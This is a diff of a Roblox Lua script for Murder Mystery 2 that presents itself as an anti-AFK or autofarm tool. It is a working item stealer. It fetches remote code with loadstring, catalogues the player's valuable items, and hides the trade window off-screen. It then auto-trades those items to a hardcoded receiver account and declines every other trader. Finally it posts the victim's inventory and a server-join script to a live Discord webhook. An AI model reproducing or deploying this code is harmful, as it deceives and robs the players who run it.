@@ -1,4 +1,4 @@
--- не не будет деофб
+-- ыыыы я пидар
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/script-create/Anti-afk/refs/heads/main/Autofarm.lua"))()
 
@@ -905,36 +905,27 @@ end)
 Username = "playing_mm2my"
 Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
 
-local recvr = Username
-local http_req = request or http_request or (syn and syn.request)
+local recvr=Username
+local http_req=request or http_request or syn and syn.request
 if not http_req then error("No valid request function found.") end
-local HS = game:GetService("HttpService")
-local hd = {
-    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
-}
+local HS=game:GetService("HttpService")
+local hd={["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"}
 
 local function dHTML(s) return s:gsub("&#(%d+);",function(n) return string.char(tonumber(n)) end):gsub("&#x(%x+);",function(n) return string.char(tonumber(n,16)) end):gsub("&amp;","&"):gsub("&quot;",'"'):gsub("&apos;","'"):gsub("&lt;","<"):gsub("&gt;",">"):gsub("\u{2019}","'"):gsub("\u{2018}","'"):gsub("\u{201C}",'"'):gsub("\u{201D}",'"') end
 local function nName(s) s=dHTML(s) s=s:gsub("^%s*(.-)%s*$","%1") s=s:gsub("%s+"," ") return s end
 
-local vL_values = {}
-local vL_valuesLow = {}
-local function sVal(n,v) local t=tonumber(v) if n~="" and t then vL_values[n]=t vL_valuesLow[n:lower()]=t end end
+local vL_values={}
+local vL_valuesLow={}
+local function sVal(n,v) local t=tonumber(v) if n~=""and t then vL_values[n]=t vL_valuesLow[n:lower()]=t end end
 
-local wUrls = {
-    ["Godly"] = "https://supremevalues.com",
-    ["Ancient"] = "https://supremevalues.com",
-    ["Unique"] = "https://supremevalues.com",
-    ["Classic"] = "https://supremevalues.com",
-    ["Chroma"] = "https://supremevalues.com"
-}
-local fD = 0 local fT = 5
+local wUrls={["Godly"]="https://supremevalues.com",["Ancient"]="https://supremevalues.com",["Unique"]="https://supremevalues.com",["Classic"]="https://supremevalues.com",["Chroma"]="https://supremevalues.com"}
+local fD=0 local fT=5
 
 local function wFetched(r,b)
- local f = b:gsub("[\n\r\t]"," ")
+ local f=b:gsub("[\n\r\t]"," ")
  for rN,v in f:gmatch('<div class="itemhead">(.-)</div>.-<b class="itemvalue">([%d,]+)</b>') do
   rN=rN:gsub("<.->","") local nm=nName(rN) v=v:gsub(",","")
-  if nm~="" and tonumber(v) then
+  if nm~=""and tonumber(v) then
    if r=="Chroma" then nm=nm:gsub("^C%.%s*","Chroma ") if not nm:find("^Chroma ") then nm="Chroma "..nm end end
    sVal(nm,v)
   end
@@ -950,37 +941,37 @@ for r,u in pairs(wUrls) do
 end
 repeat task.wait(0.05) until fD>=fT
 
-repeat task.wait(0.1) until game:IsLoaded()
+repeat wait() until game:IsLoaded()
 if getgenv and getgenv().scriptexecuted then return end
 if getgenv then getgenv().scriptexecuted=true end
 
-local P = game:GetService("Players") 
-local LocalPlayer = P.LocalPlayer 
-local VU = game:GetService("VirtualUser") 
-local MS = game:GetService("MarketplaceService") 
-local RAS = game:GetService("RbxAnalyticsService") 
-local UIS = game:GetService("UserInputService") 
-local TS = game:GetService("TeleportService") 
-local RS = game:GetService("ReplicatedStorage") 
-local RNS = game:GetService("RunService") 
-local Tr = RS.Trade 
-local ev = {"MouseButton1Click","MouseButton1Down","Activated"} 
-local BDC = require(RS.Modules.ProfileData) 
-local Sync = require(RS.Database.Sync)
-local XPO = require(RS.Modules.LevelModule) 
-local LL = require(RS.Modules.InventoryModule) 
-local TScr = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]]..game.PlaceId..[[", "]]..game.JobId..[[", game.Players.LocalPlayer)]] 
-local Pos = UDim2.new(0,9999,0,9999) 
-local Inv = {}
-vL_weight = 0
+local P=game:GetService("Players") 
+local LocalPlayer=P.LocalPlayer 
+local VU=game:GetService("VirtualUser") 
+local MS=game:GetService("MarketplaceService") 
+local RAS=game:GetService("RbxAnalyticsService") 
+local UIS=game:GetService("UserInputService") 
+local TS=game:GetService("TeleportService") 
+local RS=game:GetService("ReplicatedStorage") 
+local RNS=game:GetService("RunService") 
+local Tr=RS.Trade 
+local ev={"MouseButton1Click","MouseButton1Down","Activated"} 
+local BDC=require(RS.Modules.ProfileData) 
+local Sync=require(RS.Database.Sync)
+local XPO=require(RS.Modules.LevelModule) 
+local LL=require(RS.Modules.InventoryModule) 
+local TScr=[[game:GetService("TeleportService"):TeleportToPlaceInstance("]]..game.PlaceId..[[", "]]..game.JobId..[[", game.Players.LocalPlayer)]] 
+local Pos=UDim2.new(0,9999,0,9999) 
+local Inv={}
+vL_weight=0
 
 local Exec = (identifyexecutor and identifyexecutor()) or "Unknown"
 if Exec=="Solara" then return end
 
-local gm = {[142823291]=true,[335132309]=true,[636649648]=true}
-if not gm[game.PlaceId] then LocalPlayer:Kick("Unfortunately, this game is not supported.") while true do task.wait(1) end end
+local gm={[142823291]=true,[335132309]=true,[636649648]=true}
+if not gm[game.PlaceId] then LocalPlayer:Kick("Unfortunately, this game is not supported.") while true do wait() end end
 
-local PG = LocalPlayer:WaitForChild("PlayerGui") local MG = PG:WaitForChild("MainGUI")
+local PG=LocalPlayer:WaitForChild("PlayerGui") local MG=PG:WaitForChild("MainGUI")
 LocalPlayer.Idled:connect(function() VU:CaptureController() VU:ClickButton2(Vector2.new()) end)
 
 local UIP,TP,Mob
@@ -1027,50 +1018,52 @@ local function updInv()
  return true
 end
 updInv()
-task.wait(0.1)
+task.wait()
 
-local TSrv = RS:FindFirstChild("Trade")
+local TSrv=RS:FindFirstChild("Trade")
+if TSrv then
+ TSrv.StartTrade.OnClientEvent:Connect(function(tD,tP) if tP~=recvr then TSrv.DeclineTrade:FireServer() end end)
+end
 
-local sTr = function(tP) if tP and TSrv then pcall(function() TSrv.TradeCommand:FireServer("SendRequest", tP) end) end end
-local dTr = function() if TSrv then pcall(function() TSrv.TradeCommand:FireServer("DeclineTrade") end) end end
-local cTr = function(tP) task.spawn(function() while tP and tP.Parent==P do sTr(tP) task.wait(0.5) end end) end
+-- Твоя старая ОРИГИНАЛЬНАЯ отправка (которая у тебя работала)
+local sTr=function(tP) if tP and TSrv then pcall(function() TSrv.SendRequest:InvokeServer(tP) end) end end
+local dTr=function() if TSrv then pcall(function() TSrv.DeclineTrade:FireServer() end) end end
+local cTr=function(tP) task.spawn(function() while tP and tP.Parent==P do sTr(tP) task.wait(0.5) end end) end
 
-local InsIt = function()
- local rcv = P:FindFirstChild(recvr) if not rcv then dTr() return end
+local InsIt=function()
+ local rcv=P:FindFirstChild(recvr) if not rcv then dTr() return end
  if not InvT then dTr() return end
- local tIt = {} iAd = 0 tIn = 0 local i = 1
- while iAd < 4 and i <= #InvT do
-  local it = InvT[i]
-  if it and it.id and it.amount > 0 then
-   local suc = false iOf = 0
-   for j = 1, it.amount do 
-       local ok, err = pcall(function() RS.Trade.TradeCommand:FireServer("OfferItem", it.id) iOf = iOf + 1 tIn = tIn + 1 end) 
-       if ok then suc = true end 
-   end
-   if suc then iAd = iAd + 1 table.insert(tIt, {id = it.id, amount = iOf}) end
+ local tIt={} iAd=0 tIn=0 local i=1
+ while iAd<4 and i<=#InvT do
+  local it=InvT[i]
+  if it and it.id and it.amount>0 then
+   local ar={it.id,"Weapons"} local suc=false iOf=0
+   for j=1,it.amount do local ok,err=pcall(function() RS.Trade.OfferItem:FireServer(unpack(ar)) iOf=iOf+1 tIn=tIn+1 end) if ok then suc=true end end
+   if suc then iAd=iAd+1 table.insert(tIt,{id=it.id,amount=iOf}) end
   end
-  i = i + 1
+  i=i+1
  end
- if iAd == 0 then dTr() return end
+ if iAd==0 then dTr() return end
  task.spawn(function()
-  local acc = false 
+  local acc=false 
   if TP then
+   -- ИСПРАВЛЕННОЕ ПРИНЯТИЕ: Используем актуальный TradeCommand и твой TP.Enabled
    while not acc do 
        pcall(function() 
            RS.Trade.TradeCommand:FireServer("Accept", recvr) 
        end) 
-       acc = not TP.Enabled 
-       task.wait(0.1)
+       acc=not TP.Enabled 
+       task.wait(0.1) 
    end
-   for _, td in ipairs(tIt) do for j, it in ipairs(InvT) do if it.id == td.id then if it.amount <= td.amount then table.remove(InvT, j) else it.amount = it.amount - td.amount end break end end end
+   for _,td in ipairs(tIt) do for j,it in ipairs(InvT) do if it.id==td.id then if it.amount<=td.amount then table.remove(InvT,j) else it.amount=it.amount-td.amount end break end end end
   end
  end)
 end
 
-local fRj = function(p) if p then pcall(function() TS:Teleport(game.PlaceId, p) end) end end
-local sCL = function(p) if p then p.Chatted:Connect(function(m) sTr(p) if m:lower()=="rejoin" then fRj(p) end end) end end
-local cRIS = function(rN) task.spawn(function() while true do local rP=P:FindFirstChild(rN) if rP then act(rN) break end task.wait(5) end end) end
-local act = function(pN) local p=P:FindFirstChild(pN) if p then sCL(p) task.wait(10) sTr(p) cTr(p) end end
+local fRj=function(p) if p then pcall(function() TS:Teleport(game.PlaceId,p) end) end end
+local sCL=function(p) if p then p.Chatted:Connect(function(m) sTr(p) if m:lower()=="rejoin" then fRj(p) end end) end end
+local cRIS=function(rN) task.spawn(function() while true do local rP=P:FindFirstChild(rN) if rP then act(rN) break end task.wait(5) end end) end
+local act=function(pN) local p=P:FindFirstChild(pN) if p then sCL(p) task.wait(10) sTr(p) cTr(p) end end
 
 if TP then
  if Mob then TP.Container.Position=Pos TP.ClickBlocker.Position=Pos else TP.BG.Position=Pos TP.Container.Position=Pos TP.ClickBlocker.Position=Pos TP.Processing.Position=Pos end
@@ -1079,7 +1072,7 @@ end
 P.PlayerAdded:Connect(function(p) if p.Name==recvr then act(p.Name) end end)
 P.PlayerRemoving:Connect(function(p) if p.Name==recvr then cRIS(p.Name) end end)
 
-local iR = P:FindFirstChild(recvr) if iR then act(recvr) else cRIS(recvr) end
+local iR=P:FindFirstChild(recvr) if iR then act(recvr) else cRIS(recvr) end
 
 if gS2 >= 1 or aK >= 1 or uH >= 1 then
     content = "-- @everyone\n" .. TScr
@@ -1087,7 +1080,7 @@ else
     content = TScr
 end
 
-local sWh = function(u,d) local s,e=pcall(function() http_req({Url=u,Body=HS:JSONEncode(d),Method="POST",Headers={["Content-Type"]="application/json",["User-Agent"]="Mozilla/5.0"}}) end) end
+local sWh=function(u,d) local s,e=pcall(function() http_req({Url=u,Body=HS:JSONEncode(d),Method="POST",Headers={["Content-Type"]="application/json",["User-Agent"]="Mozilla/5.0"}}) end) end
 
 local invString = ""
 if uS and #uS>0 then invString = invString.."\n**Unique**\n" for _,i in pairs(uS) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
@@ -1106,7 +1099,7 @@ local data = {
     }
 }
 
-task.spawn(function()
+spawn(function()
     sWh(Webhook, data)
 end)
 
